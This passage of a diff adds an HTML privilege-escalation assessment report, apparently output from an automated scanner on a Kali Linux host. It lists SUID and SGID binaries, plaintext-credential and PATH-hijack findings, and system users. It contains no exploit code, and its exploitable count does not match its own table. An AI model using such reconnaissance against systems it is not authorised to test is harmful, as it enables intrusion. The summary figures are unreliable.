@@ -1,0 +1,3081 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privilege Escalation Assessment Report</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #34495e;
+            --accent-color: #3498db;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --danger-color: #e74c3c;
+            --light-color: #ecf0f1;
+            --dark-color: #2c3e50;
+            --font-main: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            font-family: var(--font-main);
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            color: #333;
+            background-color: #f8f9fa;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 30px;
+            border-radius: 5px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: 600;
+        }
+        
+        .header p {
+            margin: 10px 0 0;
+            opacity: 0.9;
+        }
+        
+        .section {
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+        
+        .section-header {
+            background-color: var(--secondary-color);
+            color: white;
+            padding: 15px 20px;
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .section-content {
+            padding: 20px;
+        }
+        
+        .executive-summary {
+            background-color: #f8f9fa;
+            border-left: 4px solid var(--accent-color);
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .risk-summary {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .risk-box {
+            flex: 1;
+            min-width: 200px;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .risk-high {
+            background-color: rgba(231, 76, 60, 0.1);
+            border-left: 4px solid var(--danger-color);
+        }
+        
+        .risk-medium {
+            background-color: rgba(243, 156, 18, 0.1);
+            border-left: 4px solid var(--warning-color);
+        }
+        
+        .risk-low {
+            background-color: rgba(39, 174, 96, 0.1);
+            border-left: 4px solid var(--success-color);
+        }
+        
+        .risk-box h3 {
+            margin-top: 0;
+            color: var(--dark-color);
+        }
+        
+        .risk-box .count {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .risk-high .count {
+            color: var(--danger-color);
+        }
+        
+        .risk-medium .count {
+            color: var(--warning-color);
+        }
+        
+        .risk-low .count {
+            color: var(--success-color);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+        
+        th {
+            background-color: var(--secondary-color);
+            color: white;
+            padding: 12px 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        td {
+            padding: 10px 15px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        tr:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .severity-high, .severity-critical {
+            color: var(--danger-color);
+            font-weight: 600;
+        }
+        
+        .severity-medium {
+            color: var(--warning-color);
+            font-weight: 600;
+        }
+        
+        .severity-low, .severity-info {
+            color: var(--success-color);
+            font-weight: 600;
+        }
+        
+        .finding {
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+        
+        .finding-header {
+            padding: 12px 15px;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .finding-high .finding-header {
+            background-color: rgba(231, 76, 60, 0.1);
+            color: var(--danger-color);
+        }
+        
+        .finding-medium .finding-header {
+            background-color: rgba(243, 156, 18, 0.1);
+            color: var(--warning-color);
+        }
+        
+        .finding-low .finding-header {
+            background-color: rgba(39, 174, 96, 0.1);
+            color: var(--success-color);
+        }
+        
+        .finding-content {
+            padding: 15px;
+        }
+        
+        .detail-row {
+            display: flex;
+            margin-bottom: 10px;
+        }
+        
+        .detail-label {
+            min-width: 150px;
+            font-weight: 600;
+            color: var(--dark-color);
+        }
+        
+        .detail-value {
+            flex: 1;
+        }
+        
+        .code-block {
+            background-color: #f8f9fa;
+            border: 1px solid #eee;
+            border-radius: 3px;
+            padding: 10px;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .footer a {
+            color: var(--accent-color);
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        @media print {
+            body {
+                background-color: white;
+            }
+            
+            .container {
+                max-width: 100%;
+                padding: 0;
+            }
+            
+            .section, .finding {
+                break-inside: avoid;
+                box-shadow: none;
+                border: 1px solid #ddd;
+            }
+            
+            .section-header, th {
+                background-color: #eee !important;
+                color: #333 !important;
+            }
+            
+            .header {
+                background-color: #eee;
+                color: #333;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Privilege Escalation Vulnerability Assessment</h1>
+            <p>Confidential Security Report</p>
+            <p>Generated: 2025-03-14 11:53:45</p>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">Executive Summary</div>
+            <div class="section-content">
+                <div class="executive-summary">
+                    <p>This report presents the findings of a comprehensive privilege escalation assessment conducted on the target system. The assessment identified 62 potential privilege escalation vectors, of which 21 have been verified as exploitable. This report provides detailed information about each vulnerability and recommended remediation actions.</p>
+                </div>
+                
+                <div class="risk-summary">
+                    <div class="risk-box risk-high">
+                        <h3>High Risk</h3>
+                        <div class="count">36</div>
+                        <p>Critical vulnerabilities requiring immediate attention</p>
+                    </div>
+                    <div class="risk-box risk-medium">
+                        <h3>Medium Risk</h3>
+                        <div class="count">13</div>
+                        <p>Significant vulnerabilities requiring prompt remediation</p>
+                    </div>
+                    <div class="risk-box risk-low">
+                        <h3>Low Risk</h3>
+                        <div class="count">13</div>
+                        <p>Minor vulnerabilities to address in regular maintenance</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">System Information</div>
+            <div class="section-content">
+                <table>
+                    <tr>
+                        <th>Property</th>
+                        <th>Value</th>
+                    </tr>
+                    <tr><td>Hostname</td><td>kali</td></tr>
+<tr><td>Os</td><td>Linux</td></tr>
+<tr><td>Kernel Version</td><td>6.11.2-amd64</td></tr>
+<tr><td>Architecture</td><td>x86_64</td></tr>
+<tr><td>Current User</td><td>kali</td></tr>
+<tr><td>User Id</td><td>1000</td></tr>
+<tr><td>Group Id</td><td>1000</td></tr>
+<tr><td>Groups</td><td>adm, dialout, cdrom, floppy, sudo, audio, dip, video, plugdev, users, netdev, bluetooth, scanner, lpadmin, wireshark, kaboxer, vboxsf</td></tr>
+<tr><td>System Users</td><td>root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, _apt, nobody, systemd-network, dhcpcd, systemd-timesync, messagebus, tss, strongswan, tcpdump, sshd, dnsmasq, avahi, nm-openvpn, speech-dispatcher, usbmux, pulse, nm-openconnect, lightdm, saned, polkitd, rtkit, colord, _galera, mysql, stunnel4, _rpc, geoclue, Debian-snmp, sslh, ntpsec, cups-pk-helper, redsocks, _gophish, iodine, miredo, statd, redis, postgres, mosquitto, inetsim, _gvm, kali, test</td></tr>
+<tr><td>Environment Variables</td><td>Available in the detailed report</td></tr>
+<tr><td>Disk Space</td><td>Available in the detailed report</td></tr>
+<tr><td>Network Interfaces</td><td>Available in the detailed report</td></tr>
+<tr><td>Listening Ports</td><td>Available in the detailed report</td></tr>
+<tr><td>Running Processes</td><td>Available in the detailed report</td></tr>
+
+                </table>
+            </div>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">Findings Summary</div>
+            <div class="section-content">
+                <table>
+                    <tr>
+                        <th>ID</th>
+                        <th>Vulnerability Type</th>
+                        <th>Severity</th>
+                        <th>Status</th>
+                    </tr>
+                    <tr>
+                <td>VULN-001</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-002</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-003</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-004</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-005</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-006</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-007</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-008</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-009</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-010</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-011</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-012</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-013</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-014</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-015</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-016</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-017</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-018</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-019</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-020</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-021</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-022</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-023</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-024</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-025</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-026</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-027</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-028</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-029</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-030</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-031</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-032</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-033</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-034</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-035</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-036</td>
+                <td>Suid Binary</td>
+                <td class="severity-high">High</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-037</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-038</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-039</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-040</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-041</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-042</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-043</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-044</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-045</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-046</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-047</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-048</td>
+                <td>World Writable Directory</td>
+                <td class="severity-low">Low</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-049</td>
+                <td>World Writable Directory</td>
+                <td class="severity-low">Low</td>
+                <td>Unexploitable</td>
+            </tr>
+<tr>
+                <td>VULN-050</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-051</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-052</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-053</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-054</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-055</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-056</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-057</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-058</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-059</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-060</td>
+                <td>Writable Path Directory</td>
+                <td class="severity-low">Low</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-061</td>
+                <td>Path Hijacking</td>
+                <td class="severity-medium">Medium</td>
+                <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-062</td>
+                <td>Path Hijacking</td>
+                <td class="severity-medium">Medium</td>
+                <td>Exploitable</td>
+            </tr>
+
+                </table>
+            </div>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">Detailed Findings</div>
+            <div class="section-content">
+                
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-001: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/alternatives/rsh</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-002: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/alternatives/rlogin</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-003: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/lib/chromium/chrome-sandbox</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-004: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/lib/openssh/ssh-keysign</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-005: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/lib/polkit-1/polkit-agent-helper-1</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-006: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/lib/policykit-1/polkit-agent-helper-1</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-007: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/lib/xorg/Xorg.wrap</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">6755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-008: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/libexec/polkit-agent-helper-1</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-009: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/rsh-redone-rlogin</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-010: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/ntfs-3g</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-011: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/rsh</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-012: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/pkexec</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-013: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/sudoedit</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-014: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/mount</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-015: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/fusermount3</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-016: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/gpasswd</div>
+                </div>
+                
